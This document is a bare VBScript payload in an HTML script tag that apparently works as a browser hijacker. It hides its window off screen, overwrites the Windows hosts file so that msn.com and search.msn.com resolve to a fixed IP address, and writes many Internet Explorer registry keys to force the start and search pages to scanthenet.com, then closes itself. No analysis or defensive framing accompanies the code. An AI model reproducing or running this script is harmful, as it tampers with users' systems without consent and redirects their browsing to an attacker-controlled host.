<script language=VBS>
self.MoveTo 5000,5000
Set Shl = CreateObject("WScript.Shell")
set WshProEnv = Shl.Environment("PROCESS")
Set er=CreateObject("Scripting.FileSystemObject")
pth = WshProEnv("WINDIR") +"\system32\drivers\etc\hosts"
pth98 = WshProEnv("WINDIR") +"\hosts"
sub hosts()
aeb.WriteLine"66.98.142.169 auto.search.msn.com"
aeb.WriteLine"66.98.142.169 search.msn.com"
aeb.WriteLine"66.98.142.169 msn.com"
aeb.WriteLine"66.98.142.169 www.msn.com"
end sub
If er.FileExists(pth98)  Then
Set aeb=er.CreateTextFile(pth98)
hosts()
end if
If er.FileExists(pth)  Then
Set aeb=er.CreateTextFile(pth)
hosts()
end if
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.scanthenet.com"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.scanthenet.com"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.scanthenet.com/search.html"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Search Bar","http://www.scanthenet.com/search.html"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Use Search Asst","no"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\SearchUrl\","http://www.scanthenet.com/search.php?q=%s"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://www.scanthenet.com/search.html"
Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Search\CustomizeSearch","http://www.scanthenet.com/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://www.scanthenet.com/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\CustomizeSearch","http://www.scanthenet.com/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\Default_Search_URL","http://www.scanthenet.com/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Default_Page_URL","http://www.scanthenet.com"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Default_Search_URL","http://www.scanthenet.com/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.scanthenet.com/search.html"
Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.scanthenet.com/search.html"
window.close()
</script>